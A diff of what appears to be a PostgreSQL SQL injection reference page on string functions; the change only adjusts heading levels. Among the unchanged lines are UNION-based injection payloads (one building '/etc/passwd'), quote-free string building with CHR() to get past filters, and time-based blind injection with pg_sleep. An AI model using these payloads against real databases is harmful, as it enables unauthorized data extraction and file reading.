@@ -7,11 +7,9 @@ tags: ["string operations", "concatenation", "sql functions"]
 lastUpdated: 2025-12-07
 ---
 
-## String Concatenation
-
 String concatenation is essential for constructing complex queries or bypassing filters during SQL injection. PostgreSQL provides several methods to concatenate strings.
 
-### Using || Operator
+## Using || Operator
 
 The primary method for string concatenation in PostgreSQL:
 
@@ -23,7 +21,7 @@ SELECT 'Hello' || ' ' || 'World';
 -- Result: 'Hello World'
 ```
 
-### CONCAT() Function
+## CONCAT() Function
 
 Available in PostgreSQL 9.1+:
 
@@ -46,7 +44,7 @@ SELECT 'a' || NULL || 'c';
 -- Result: NULL
 ```
 
-### CONCAT_WS() Function
+## CONCAT_WS() Function
 
 Concatenate with separator (PostgreSQL 9.1+):
 
@@ -58,7 +56,7 @@ SELECT CONCAT_WS(':', 'user', 'password');
 -- Result: 'user:password'
 ```
 
-### STRING_AGG() Function
+## STRING_AGG() Function
 
 Aggregate multiple rows into a single string:
 
@@ -71,7 +69,7 @@ SELECT STRING_AGG(username, ',' ORDER BY username) FROM users;
 -- Result: 'admin,guest,user1'
 ```
 
-### ARRAY_TO_STRING() Function
+## ARRAY_TO_STRING() Function
 
 Convert arrays to strings:
 
@@ -83,7 +81,7 @@ SELECT ARRAY_TO_STRING(ARRAY(SELECT username FROM users), ',');
 -- Returns all usernames as comma-separated string
 ```
 
-### Using FORMAT()
+## Using FORMAT()
 
 PostgreSQL's printf-style formatting:
 
@@ -94,7 +92,7 @@ SELECT FORMAT('%s:%s', 'username', 'password');
 SELECT FORMAT('User: %s (ID: %s)', username, id) FROM users;
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Extracting multiple column values
@@ -110,7 +108,7 @@ SELECT FORMAT('User: %s (ID: %s)', username, id) FROM users;
 ' UNION SELECT NULL,'/etc/'||'passwd',NULL--
 ```
 
-### Building Strings Without Quotes
+## Building Strings Without Quotes
 
 Using `CHR()` with concatenation:
 
@@ -120,7 +118,7 @@ SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
 -- Result: 'admin'
 ```
 
-### Type Casting in Concatenation
+## Type Casting in Concatenation
 
 When concatenating different types:
 
@@ -132,7 +130,7 @@ SELECT 'ID: ' || id::text FROM users;
 SELECT 'ID: ' || CAST(id AS text) FROM users;
 ```
 
-### String Length and Position Functions
+## String Length and Position Functions
 
 Essential functions for blind SQL injection character extraction:
 
@@ -161,7 +159,7 @@ SELECT STRPOS('admin', 'min');
 -- Result: 3
 ```
 
-### Substring Extraction Functions
+## Substring Extraction Functions
 
 ```sql
 -- SUBSTRING() - Extract portion of string
@@ -184,7 +182,7 @@ SELECT RIGHT('admin', 3);
 -- Result: 'min'
 ```
 
-### Blind Injection with String Functions
+## Blind Injection with String Functions
 
 ```sql
 -- Extract string length first
@@ -203,7 +201,7 @@ SELECT RIGHT('admin', 3);
 ' AND CASE WHEN LENGTH(current_database())>5 THEN pg_sleep(3) ELSE pg_sleep(0) END--
 ```
 
-### Notes
+## Notes
 
 - The `||` operator is SQL-standard and preferred in PostgreSQL
 - `CONCAT()` and `CONCAT_WS()` require PostgreSQL 9.1+
